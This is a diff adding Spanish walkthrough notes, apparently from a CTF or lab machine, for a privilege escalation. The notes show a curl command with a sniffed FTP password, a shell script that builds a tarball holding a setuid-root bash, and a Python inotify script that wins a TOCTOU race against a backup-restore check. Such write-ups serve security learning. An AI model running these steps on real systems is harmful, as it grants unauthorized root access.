@@ -114,3 +114,77 @@ crea un archivo json malicioso
 * usando pspy64 puedes encontrar la contraseña del ftp
 
   /usr/bin/curl -T /tmp/_opt_staging.tar.gz ftp://ftpuser:KTkJSAjuDjSOocAYLgYa@127.0.0.1:15432/upload/_opt_staging.tar.gz
+
+
+* usando un script de python tienes que abusar de una vulnerabilidad TOCTOU
+
+1- el scritp de backup revisa que exista el archivo en /var/restore_work
+2- Revisa que tenga una checksum (que no hay manera de calcular)
+3- si todo es valido, entoces reemplza la carpeta 
+
+??? Lo que tienes que hacer es esperar a que se revise el SHA/checksum y en ese momento, reemplazar el archivo por uno malicioso. ganar la carrera
+
+* crea un archvo malicioso tar que contenga una rootshell
+
++++ evil-tar.sh +++ 
+
+mkdir -p /tmp/evil/opt/blocksynergy
+cp /bin/bash /tmp/evil/opt/blocksynergy/rootshell
+chmod 4755 /tmp/evil/opt/blocksynergy/rootshell
+
+tar --owner=0 --group=0 --numeric-owner \
+  -czf /tmp/evil.tar.gz \
+  -C /tmp/evil opt/blocksynergy/rootshell
+
+tar -tvzf /tmp/evil.tar.gz
+
+++++ EOF +++
+
+* colocalo en  /var/restore_work/.evil-ready.tar.gz
+
+
++++ racewiner.py +++
+import ctypes
+import os
+import struct
+
+directory = b"/var/restore_work"
+filename = "_opt_staging.tar.gz"
+ready = "/var/restore_work/.evil-ready.tar.gz"
+target = "/var/restore_work/_opt_staging.tar.gz"
+
+IN_CLOSE_WRITE = 0x08
+IN_OPEN = 0x20
+
+libc = ctypes.CDLL("libc.so.6", use_errno=True)
+fd = libc.inotify_init1(0)
+libc.inotify_add_watch(fd, directory, IN_CLOSE_WRITE | IN_OPEN)
+
+download_finished = False
+print("watcher ready", flush=True)
+
+while True:
+    data = os.read(fd, 4096)
+    offset = 0
+
+    while offset < len(data):
+        wd, mask, cookie, length = struct.unpack_from("iIII", data, offset)
+        offset += 16
+        name = data[offset:offset + length].split(b"\0", 1)[0].decode()
+        offset += length
+
+        if name != filename:
+            continue
+
+        if mask & IN_CLOSE_WRITE:
+            download_finished = True
+            print("download closed", flush=True)
+        elif download_finished and mask & IN_OPEN:
+            os.replace(ready, target)
+            print("archive swapped", flush=True)
+            raise SystemExit
++++ EOF +++
+
+* dispara el scritp con un "touch /opt/staging/restore" con el racewiner.py corriendo
+
+* listo tu rootshell ira a /opt/blocksynergy
